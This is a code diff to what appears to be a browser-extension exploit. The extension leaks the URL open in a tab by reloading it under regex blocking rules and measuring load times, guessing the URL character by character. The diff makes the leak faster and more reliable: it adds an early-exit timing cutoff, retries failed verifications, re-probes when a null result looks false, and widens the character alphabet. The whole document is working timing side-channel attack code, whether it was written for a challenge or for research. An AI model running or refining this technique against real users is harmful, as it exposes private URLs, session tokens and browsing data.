@@ -8,7 +8,7 @@ const cls   = a => `[${a.map(escCC).join("")}]`;
 const ALPHABET =
   "abcdefghijklmnopqrstuvwxyz" +
   "ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
-  "0123456789:/?&=.-_%#@!~+,;";
+  "0123456789:/?&=.-_%#@!~+,;'";
 
 const SORTED  = [...ALPHABET].sort();
 const SCHEMES = ["https://", "http://"];
@@ -68,27 +68,44 @@ const clearRules = async () => {
 // Uses per-probe temporary listeners. Waits for "loading" BEFORE accepting
 // "complete" so stale completion events from error pages are ignored.
 
-const reloadTab = (tabId) => {
+// earlyExitMs: once this many ms have elapsed since the reload (measured from
+// the moment "loading" fires) we already know the URL was NOT blocked — resolve
+// immediately instead of waiting for the full page load to complete.
+const reloadTab = (tabId, earlyExitMs = TIMEOUT_MS) => {
     return new Promise(resolve => {
         if (abortLeak) { resolve(null); return; }
         let sawLoading = false;
+        let resolved   = false;
+        let earlyTimer = null;
+        const start    = performance.now();
+
+        const finish = (t) => {
+            if (resolved) return;
+            resolved = true;
+            chrome.tabs.onUpdated.removeListener(listener);
+            clearTimeout(timer);
+            clearTimeout(earlyTimer);
+            resolve(t);
+        };
 
         const listener = (tid, info) => {
             if (tid !== tabId) return;
-            if (info.status === "loading") sawLoading = true;
+            if (info.status === "loading" && !sawLoading) {
+                sawLoading = true;
+                // Schedule early exit at exactly earlyExitMs from reload start.
+                // Subtract time already elapsed waiting for the loading event.
+                const remaining = earlyExitMs - (performance.now() - start);
+                earlyTimer = setTimeout(
+                    () => finish(performance.now() - start),
+                    Math.max(0, remaining)
+                );
+            }
             if (info.status === "complete" && sawLoading) {
-                chrome.tabs.onUpdated.removeListener(listener);
-                clearTimeout(timer);
-                resolve(performance.now() - start);
+                finish(performance.now() - start);
             }
         };
 
-        const start = performance.now();
-        const timer = setTimeout(() => {
-            chrome.tabs.onUpdated.removeListener(listener);
-            resolve(abortLeak ? null : TIMEOUT_MS);
-        }, TIMEOUT_MS);
-
+        const timer = setTimeout(() => finish(abortLeak ? null : TIMEOUT_MS), TIMEOUT_MS);
         chrome.tabs.onUpdated.addListener(listener);
         chrome.tabs.reload(tabId, { bypassCache: true });
     });
@@ -162,7 +179,9 @@ const blockedBy = async (regex, tabId) => {
     let blocks = 0, votes = 0;
     for (let i = 0; i < MAX_VOTES; i++) {
         if (abortLeak) return false;
-        const t = await reloadTab(tabId);
+        // Pass hi as the early-exit cutoff: as soon as elapsed > hi we know
+        // the URL was allowed, so there's no need to wait for the full load.
+        const t = await reloadTab(tabId, hi);
         if (t === null) return false;
         votes++;
         const hit = t < blockThreshold;
@@ -219,8 +238,12 @@ const leakChar = async (scheme, prefix, tabId) => {
     }
     const c = set[0];
     if (!c) return null;
-    const verified = await blockedBy(makeProbeRe(scheme, prefix, `[${escCC(c)}]`), tabId);
-    return verified ? c : null;
+    // Verify the narrowed character; retry once on failure to guard against
+    // a single noisy sample causing premature URL termination.
+    const v1 = await blockedBy(makeProbeRe(scheme, prefix, `[${escCC(c)}]`), tabId);
+    if (v1) return c;
+    const v2 = await blockedBy(makeProbeRe(scheme, prefix, `[${escCC(c)}]`), tabId);
+    return v2 ? c : null;
 };
 
 const leak = async (tabId) => {
@@ -283,7 +306,17 @@ const leak = async (tabId) => {
             }
             break;
         }
-        if (!c) break;
+        if (!c) {
+            // leakChar can return null due to timing noise even when more characters
+            // remain. Confirm with a full-alphabet probe before terminating.
+            const anyMore = await blockedBy(makeProbeRe(scheme, out, cls(SORTED)), tabId);
+            if (!abortLeak && anyMore) {
+                console.log(`[~] False null at position ${i} — retrying leakChar`);
+                i--; // for-loop will increment back to i, retrying this position
+                continue;
+            }
+            break;
+        }
         sameCount = (c === prev) ? sameCount + 1 : 0;
         if (sameCount >= 3) break;
         out += c;
